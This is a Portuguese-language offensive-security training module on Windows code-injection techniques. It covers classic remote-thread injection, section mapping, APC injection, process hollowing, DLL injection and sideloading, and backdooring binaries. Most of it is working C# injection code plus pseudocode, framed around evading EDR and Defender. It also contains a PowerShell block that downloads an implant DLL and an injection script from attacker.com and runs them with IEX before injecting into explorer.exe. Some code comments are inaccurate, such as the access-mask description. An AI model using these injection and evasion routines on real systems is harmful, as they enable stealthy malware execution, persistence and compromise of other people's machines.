# Módulo 2: Técnicas de Injeção de Código

## Overview

Após burlar mecanismos de detecção, o próximo passo é garantir persistência executando código em processos legítimos em vez de abrir novas janelas que chamem atenção.

```
Shellcode Runner (nosso programa)
         │
         ├─→ Detectável se deixar janela aberta
         │
         └─→ Injetar em processo legítimo
              └─→ Explorer.exe, svchost.exe, spoolsv.exe
                  (difícil de derrubar/notar)
```

---

## 1. Classic Process Injection

### Conceito
Injetar shellcode em um processo já aberto usando APIs padrão do Windows.

### APIs Utilizadas
1. **OpenProcess** - Abrir handle do processo
2. **VirtualAllocEx** - Alocar memória no processo remoto
3. **WriteProcessMemory** - Escrever shellcode na memória remota
4. **CreateRemoteThread** - Criar thread para executar código

### Fluxo de Execução
```
┌──────────────────────────┐
│ Processo Alvo            │
│ (ex: explorer.exe)       │
├──────────────────────────┤
│                          │
│  [Heap Memory]           │ ← VirtualAllocEx aloca aqui
│  ┌──────────────────┐    │
│  │ Shellcode Inject │    │ ← WriteProcessMemory copia aqui
│  └──────────────────┘    │
│       ↑                  │
│       │ CreateRemoteThread │ ← Executa daqui
│  [Active Threads]        │
│                          │
└──────────────────────────┘
```

### Implementação C#
```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

class ClassicInjection {
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenProcess(
        uint processAccess, bool bInheritHandle, int processId);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAllocEx(
        IntPtr hProcess, IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool WriteProcessMemory(
        IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer,
        uint nSize, out UIntPtr lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateRemoteThread(
        IntPtr hProcess, IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    public static void InjectShellcode(int processId, byte[] shellcode) {
        // 1. Abrir processo alvo (precisa de privilégios)
        IntPtr hProcess = OpenProcess(
            0x0028,  // PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ
            false, processId);
        
        if (hProcess == IntPtr.Zero) {
            Console.WriteLine("Erro: Não foi possível abrir processo");
            return;
        }

        // 2. Alocar memória no processo remoto
        IntPtr alloc = VirtualAllocEx(hProcess, IntPtr.Zero,
            (uint)shellcode.Length, 0x1000, 0x04);
        
        if (alloc == IntPtr.Zero) {
            Console.WriteLine("Erro: Não foi possível alocar memória");
            return;
        }

        // 3. Escrever shellcode
        WriteProcessMemory(hProcess, alloc, shellcode,
            (uint)shellcode.Length, out UIntPtr written);
        
        Console.WriteLine($"Shellcode escrito: {written} bytes");

        // 4. Criar thread remota
        IntPtr thread = CreateRemoteThread(hProcess, IntPtr.Zero, 0,
            alloc, IntPtr.Zero, 0, out uint threadId);
        
        Console.WriteLine($"Thread criada: {threadId}");
    }
}
```

### Detecção e Evasão

**Como é detectado:**
- IAT contém OpenProcess, VirtualAllocEx, WriteProcessMemory
- Padrão de APIs é bem conhecido
- EDR monitora CreateRemoteThread

**Como evitar:**
- Usar D/Invoke (remove de IAT)
- Usar syscalls diretos
- Verificar integridade de memória antes de escrever

### Security Permissions

```csharp
// Precisamos de privilégios adequados
// Diferentes níveis de integridade bloqueiam injeção

// Verificar nível de integridade do alvo
// Medium ou Low = conseguimos injetar
// High/System = precisa ser admin
// PROTECTED = PPL, não conseguimos injetar
```

---

## 2. NtMapViewOfSection Injection

### Conceito
Criar objeto compartilhado entre processos e mapear shellcode nele.

### APIs Utilizadas
- **NtCreateSection** - Criar seção de memória compartilhada
- **NtMapViewOfSection** - Mapear seção no nosso processo
- **NtUnmapViewOfSection** - Desmapar da memória
- **CreateRemoteThread** - Executar em processo remoto

### Vantagem
Menos detectável pois não usa WriteProcessMemory diretamente.

### Fluxo
```
1. NtCreateSection → Criar objeto de memória compartilhada
2. NtMapViewOfSection (nosso processo) → Mapear seção localmente
3. Copiar shellcode → Para o objeto compartilhado
4. NtMapViewOfSection (processo remoto) → Mapear mesmo objeto remotamente
5. NtUnmapViewOfSection → Desmapar nossa visão
6. CreateRemoteThread → Executar código no processo remoto
```

### Implementação (Conceitual)
```csharp
// Pseudocódigo
NtCreateSection(ref hSection, ...);
NtMapViewOfSection(hSection, GetCurrentProcess(), ref alloc, ...);
// Copiar shellcode em alloc
NtMapViewOfSection(hSection, hProcessRemoto, ref remoteAddr, ...);
NtUnmapViewOfSection(GetCurrentProcess(), alloc);
CreateRemoteThread(hProcessRemoto, IntPtr.Zero, 0, remoteAddr, ...);
```

### Vantagens vs Desvantagens

**✅ Vantagens:**
- Menos detecções por assinatura
- WriteProcessMemory não aparece no trace
- EDR não vê cópia de dados

**❌ Desvantagens:**
- APIs mais obscuras (NT API)
- Comportamento menos comum = mais suspeito em alguns cenários
- Requer D/Invoke

---

## 3. QueueUserAPC Injection

### Conceito
Adicionar função à fila de APC (Asynchronous Procedure Call) de uma thread.

### O que é APC?
```
Toda thread tem fila interna:
┌────────────────────────────┐
│ APC Queue                  │
├────────────────────────────┤
│ [Function1]                │
│ [Function2]                │
│ [Our Shellcode] ← Insert   │
│ [Function3]                │
└────────────────────────────┘

Quando thread entra em "estado de alerta" (SleepEx, WaitForSingleObjectEx),
a fila é processada LIFO (Last In First Out) ou FIFO
```

### APIs Utilizadas
- **CreateProcess** - Criar processo suspenso (CREATE_SUSPENDED)
- **VirtualAllocEx** - Alocar espaço para shellcode
- **WriteProcessMemory** - Escrever shellcode
- **QueueUserAPC** - Adicionar à fila APC
- **ResumeThread** - Retomar execução

### Fluxo
```
1. CreateProcess(..., CREATE_SUSPENDED) → Processo criado, parado
2. VirtualAllocEx → Alocar memória
3. WriteProcessMemory → Copiar shellcode
4. QueueUserAPC → Adicionar shellcode à fila (será primeira coisa executada)
5. ResumeThread → Thread começa, executa APC (nosso shellcode)
```

### Vantagens
- **Silencioso:** Não cria threads visíveis
- **Limpo:** O processo original ainda funciona depois
- **Controle:** Podemos executar antes de qualquer código legítimo

### Implementação C#
```csharp
[DllImport("kernel32.dll")]
private static extern IntPtr CreateProcess(
    string lpApplicationName, string lpCommandLine,
    IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
    bool bInheritHandles, uint dwCreationFlags,
    IntPtr lpEnvironment, string lpCurrentDirectory,
    [In] ref STARTUPINFO lpStartupInfo,
    out PROCESS_INFORMATION lpProcessInformation);

[DllImport("kernel32.dll")]
private static extern IntPtr QueueUserAPC(
    IntPtr pfnAPC, IntPtr hThread, UIntPtr dwData);

[DllImport("kernel32.dll")]
private static extern uint ResumeThread(IntPtr hThread);

[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
struct STARTUPINFO {
    public uint cb;
    public string lpReserved;
    public string lpDesktop;
    public string lpTitle;
    // ... outros campos
}

[StructLayout(LayoutKind.Sequential)]
struct PROCESS_INFORMATION {
    public IntPtr hProcess;
    public IntPtr hThread;
    public uint dwProcessId;
    public uint dwThreadId;
}

public static void ApcInjection(string targetApp, byte[] shellcode) {
    STARTUPINFO si = new STARTUPINFO();
    PROCESS_INFORMATION pi;
    si.cb = (uint)Marshal.SizeOf(si);

    // 1. Criar processo suspenso
    CreateProcess(targetApp, null, IntPtr.Zero, IntPtr.Zero,
        false, 0x00000004, // CREATE_SUSPENDED
        IntPtr.Zero, null, ref si, out pi);

    // 2-3. Alocar e escrever
    IntPtr alloc = VirtualAllocEx(pi.hProcess, IntPtr.Zero,
        (uint)shellcode.Length, 0x1000, 0x04);
    WriteProcessMemory(pi.hProcess, alloc, shellcode,
        (uint)shellcode.Length, out _);

    // 4. Adicionar à fila APC
    QueueUserAPC(alloc, pi.hThread, UIntPtr.Zero);

    // 5. Retomar thread
    ResumeThread(pi.hThread);
}
```

---

## 4. Process Hollowing (RunPE)

### Conceito
Substituir código de um processo legítimo pelo nosso sem criar novo processo visível.

### Técnica "RunPE"
1. Criar processo suspenso
2. Desalocar seção .text original
3. Injetar nosso código no entry point
4. Alterar contexto da thread (EIP/RIP)
5. Resumir

### Fluxo
```
┌──────────────────────────────────────────┐
│ Processo Legítimo (calc.exe)             │
├──────────────────────────────────────────┤
│                                          │
│ [PE Header]                              │
│ ├─ Base Address: 0x400000               │
│ ├─ Entry Point: 0x401000                │
│                                          │
│ [Seções Originais]                       │
│ ├─ .text (original)   ← Desalocar       │
│ ├─ .data                                 │
│ ├─ .rsrc                                 │
│                                          │
│ [Injetar Nosso PE]                       │
│ ├─ Novo .text (nosso código)             │
│ ├─ Novo .data (nossas dados)             │
│                                          │
│ [Thread Context]                         │
│ ├─ EIP alterado → Novo Entry Point       │
│ ├─ ESP/EBP ajustados                     │
│                                          │
└──────────────────────────────────────────┘
```

### Entry Point Localização
```
PEB → PE Header → e_lfanew offset
Base Address + e_lfanew + 0x28 = AddressOfEntryPoint (relativo)
Base Address + (AddressOfEntryPoint) = EndereçoAbsoluto
```

### APIs Necessárias
- **CreateProcess** - Suspenso
- **ZwQueryInformationProcess** - Obter PEB
- **ReadProcessMemory** - Ler PEB
- **WriteProcessMemory** - Escrever novo código
- **GetThreadContext/SetThreadContext** - Alterar EIP/RIP

### Vantagens
- **Totalmente transparente:** Usa binário legítimo
- **Assinatura:** calc.exe aparece no Task Manager
- **Nenhuma nova janela:** Executa em background

### Desvantagens
- **Complexo:** Requer manipulação de PE
- **Frágil:** Se cálculo de endereço falhar, crash
- **Detectável:** EDR vê allocate + write + thread resume em padrão

### Implementação (Conceitual - Pseudocódigo)
```csharp
// Simplificado para entendimento
public static void ProcessHollowing(string targetApp, byte[] maliciousPE) {
    // 1. Criar processo suspenso
    PROCESS_INFORMATION pi;
    CreateProcess(targetApp, ..., CREATE_SUSPENDED, ..., out pi);

    // 2. Obter base address via PEB
    PROCESS_BASIC_INFORMATION pbi;
    ZwQueryInformationProcess(pi.hProcess, 0, ref pbi, ...);
    
    // 3. Ler PE header
    IntPtr pebBase = pbi.PebBaseAddress;
    byte[] pebData = new byte[0x200];
    ReadProcessMemory(pi.hProcess, pebBase + 0x10, pebData, ...);
    IntPtr baseAddress = BitConverter.ToInt64(pebData, 0);

    // 4. Encontrar entry point
    byte[] dosHeader = new byte[0x200];
    ReadProcessMemory(pi.hProcess, baseAddress, dosHeader, ...);
    uint e_lfanew = BitConverter.ToUInt32(dosHeader, 0x3C);
    
    byte[] peHeader = new byte[0x100];
    ReadProcessMemory(pi.hProcess, baseAddress + e_lfanew + 0x28, peHeader, ...);
    uint entryPoint = BitConverter.ToUInt32(peHeader, 0);

    // 5. Desalocar código original
    VirtualFreeEx(pi.hProcess, baseAddress, 0x1000, MEM_DECOMMIT);

    // 6. Injetar novo código
    IntPtr alloc = VirtualAllocEx(pi.hProcess, baseAddress, 
        (uint)maliciousPE.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, alloc, maliciousPE, ...);

    // 7. Alterar contexto de thread
    CONTEXT ctx = new CONTEXT();
    GetThreadContext(pi.hThread, ref ctx);
    ctx.Eip = (uint)(baseAddress + entryPoint);
    SetThreadContext(pi.hThread, ref ctx);

    // 8. Resumir
    ResumeThread(pi.hThread);
}
```

---

## 5. DLL Injection

### Conceito
Carregar DLL maliciosa em processo remoto usando **LoadLibraryA/W**.

### Método 1: Disk-Based (Detectable)
```
1. Salvar DLL maliciosa em disco
2. AbrirProcesso remoto
3. VirtualAllocEx + WriteProcessMemory (caminho da DLL)
4. CreateRemoteThread com LoadLibraryA como função
5. Quando CreateRemoteThread executa, o processo carrega nossa DLL
```

**Problema:** DLL está em disco = detectável, pode ter MOTW

### Implementação - Disk Based
```csharp
public static void DLLInjectionDisk(int targetPid, string dllPath) {
    IntPtr hProcess = OpenProcess(0x0028, false, targetPid);
    
    // Alocar para string do caminho da DLL
    IntPtr pathAllocated = VirtualAllocEx(hProcess, IntPtr.Zero,
        (uint)dllPath.Length + 1, 0x1000, 0x04);
    
    // Escrever caminho
    WriteProcessMemory(hProcess, pathAllocated,
        System.Text.Encoding.ASCII.GetBytes(dllPath),
        (uint)dllPath.Length, out _);
    
    // GetProcAddress de LoadLibraryA
    IntPtr kernel32 = LoadLibrary("kernel32.dll");
    IntPtr loadLibAddr = GetProcAddress(kernel32, "LoadLibraryA");
    
    // CreateRemoteThread com LoadLibraryA como função start
    CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibAddr,
        pathAllocated, 0, out _);
}
```

### Método 2: Reflective DLL Injection (In-Memory)
```
1. Baixar DLL em memória (byte array)
2. Usar PowerShell com Invoke-ReflectivePEInjection
3. DLL nunca toca o disco
4. Mais OPSEC
```

**PowerShell Example:**
```powershell
# Baixar DLL
$bytes = (New-Object System.Net.WebClient).DownloadData('http://attacker.com/implant.dll')

# Carregar script que injeta
IEX (New-Object System.Net.WebClient).DownloadString('http://attacker.com/Invoke-ReflectivePEInjection.ps1')

# Injetar em explorer.exe
$procId = (Get-Process explorer).Id
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procId
```

### Método 3: Shellcode Reflective DLL Injection (sRDI)
```
1. Compilar DLL
2. Converter DLL → Shellcode com ferramenta sRDI
3. Usar shellcode runner normal para executar
4. Dentro da memória, DLL é decompactada e executada
5. Mais evasivo: trata-se de shellcode, não DLL
```

---

## 6. DLL Sideloading (DLL Search Order Hijacking)

### Conceito
Binário legítimo procura por DLL em locais previsíveis. Se colocarmos DLL maliciosa nesse caminho, ela é carregada.

### DLL Search Order (Windows)
```
1. Directory of the application (exe local)
2. System directory (C:\Windows\System32)
3. System16 directory (C:\Windows\SysWOW64 em 32-bit)
4. Windows directory (C:\Windows)
5. Current working directory
6. Directories in PATH environment variable
```

### Exemplo Prático
```
Legitimo:
C:\Program Files\Legit App\app.exe
    ↓
    Procura por: msvcr120.dll
    
Nossa injeção:
C:\Program Files\Legit App\msvcr120.dll (versão maliciosa)
    ↓
    app.exe carrega NOSSA DLL ao invés do sistema
```

### Implementação
```
1. Usar ProcMon para descobrir quais DLLs o binário procura
2. Copiar DLL legítima
3. Injetar código malicioso dentro
4. Colocar no diretório do binário legítimo
5. Executar binário legítimo
6. Nossa DLL é carregada automaticamente
```

**Ferramentas:**
- Procmon (detectar DLL searches)
- DLLForwarder (proxy entre DLL legítima e maliciosa)
- Custom packing tools

### Vantagens
- ✅ Execution context é totalmente legítimo
- ✅ Comportamento de carga é normal
- ✅ Assinatura do binário está intacta
- ✅ Pode incluir legitimacy (certificado válido)

### Desvantagens
- ❌ Requer colocar arquivo em disco
- ❌ EDR pode monitorar DLL load order
- ❌ Detectável se DLL não funcionar corretamente

---

## 7. Backdooring de Binários

### Conceito
Modificar binário legítimo para conter backdoor mantendo funcionalidade original.

### Fluxo
```
┌────────────────────────────────────┐
│ Binário Legítimo (notepad.exe)     │
├────────────────────────────────────┤
│                                    │
│ [Code Cave] ← Espaço não utilizado │
│ ├─ Nosso shellcode                 │
│ ├─ Conectar C2                     │
│ ├─ Jump de volta                   │
│                                    │
│ [Entry Point Modificado]           │
│ └─ Apontar para nosso shellcode    │
│                                    │
│ [Código Original]                  │
│ └─ Funciona normalmente depois     │
│                                    │
└────────────────────────────────────┘
```

### Etapas

1. **Encontrar Code Cave** - Espaço não utilizado no PE
2. **Injetar shellcode** - Colocar código no espaço
3. **Salvar contexto** - Push de registradores
4. **Executar backdoor** - Nosso código
5. **Restaurar contexto** - Pop de registradores
6. **Pular de volta** - Para código original

### Implementação (Pseudocódigo Assembly)
```asm
; Code Cave (0x401500)
push rbp
push rsi
push rdi

; Nosso código
mov rax, 0xdeadbeef  ; C2 address
call rax

pop rdi
pop rsi
pop rbp

; Voltar para código original
jmp 0x401000
```

### Ferramentas
- HexEdit
- PE Studio
- Custom scripts em Python (pefile)

### Considerações
- **ASLR/DEP:** Binário alvo não pode ter essas proteções
- **Tamanho:** Precisa haver espaço suficiente
- **Funcionalidade:** Binário ainda precisa funcionar
- **Detecção:** Pode ser detectado por análise estática

---

## 📊 Comparação de Técnicas

| Técnica | Complexidade | Detecção | OPSEC | Persistência |
|---------|-------------|----------|-------|--------------|
| Classic | Baixa | Alta | Ruim | Sessão |
| NtMapViewOfSection | Média | Média | Bom | Sessão |
| APC | Média | Média | Excelente | Sessão |
| Hollowing | Alta | Média | Bom | Sessão |
| DLL Disk | Baixa | Alta | Ruim | Sessão |
| DLL Memory | Média | Baixa | Excelente | Sessão |
| Sideloading | Média | Média | Bom | Sessão |
| Backdoor | Alta | Baixa | Excelente | Persistente |

---

## 🎯 Checklist de Implementação

- [ ] Classic Process Injection funcional
- [ ] D/Invoke integrado
- [ ] APC Injection entendido e testado
- [ ] Process Hollowing conceitos compreendidos
- [ ] DLL Injection (disco) funcional
- [ ] Reflective DLL Injection testada
- [ ] DLL Sideloading preparado
- [ ] Backdoor binário compreendido
- [ ] Todos os métodos testados contra Defender
- [ ] IOCs documentados

---

**Módulo 2 Concluído** ✅
